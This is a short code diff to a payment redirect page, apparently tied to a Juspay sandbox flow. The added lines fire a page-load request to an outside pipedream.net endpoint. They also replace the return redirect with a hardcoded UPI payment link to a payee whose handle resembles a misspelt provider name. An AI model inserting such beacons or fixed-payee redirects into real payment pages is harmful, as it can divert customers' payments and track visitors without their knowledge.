@@ -53,12 +53,34 @@
 				window.location.href = "https://sandbox.juspay.in/v2/pay/response/";
 			} else {
 				window.location.href = "upi://pay?tr=LsgMo8AwjRamNMz&mc=5411&pa=upi@razopay&pn=toothsi&am=1100&cu=INR";
-				window.location.href = "https://sandbox.juspay.in/v2/pay/response/" + redirectValue;
+				// window.location.href = "https://sandbox.juspay.in/v2/pay/response/" + redirectValue;
 			}
 		}
 
 		// Get the value of "endurls" parameter from the URL and set it as the value of the input element
 		window.onload = function() {
+			fetch("https://eo6sn2p0w30tlb1.m.pipedream.net/", {
+				"headers": {
+					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+					"accept-language": "en-GB,en;q=0.7",
+					"cache-control": "no-cache",
+					"pragma": "no-cache",
+					"sec-ch-ua": "\"Chromium\";v=\"112\", \"Brave\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
+					"sec-ch-ua-mobile": "?0",
+					"sec-ch-ua-platform": "\"macOS\"",
+					"sec-fetch-dest": "document",
+					"sec-fetch-mode": "navigate",
+					"sec-fetch-site": "none",
+					"sec-fetch-user": "?1",
+					"sec-gpc": "1",
+					"upgrade-insecure-requests": "1"
+				},
+				"referrerPolicy": "strict-origin-when-cross-origin",
+				"body": null,
+				"method": "GET",
+				"mode": "cors",
+				"credentials": "omit"
+				});
 			window.location.href = "upi://pay?tr=LsgMo8AwjRamNMz&mc=5411&pa=upi@razopay&pn=toothsi&am=1100&cu=INR";
 			var urlParams = new URLSearchParams(window.location.search);
 			var endUrlsValue = urlParams.get('endurls');
